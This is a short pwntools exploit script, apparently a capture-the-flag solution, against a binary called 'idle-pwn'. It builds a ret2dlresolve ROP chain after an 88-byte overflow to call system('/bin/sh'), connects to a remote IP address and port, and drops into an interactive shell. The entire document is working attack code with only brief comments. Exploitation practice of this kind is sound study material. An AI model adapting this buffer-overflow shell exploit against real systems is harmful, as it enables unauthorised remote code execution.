from pwn import *

elf = context.binary = ELF('./idle-pwn', checksec=False)
p = elf.process()
p = remote('103.167.132.234', 27423)
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 88)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()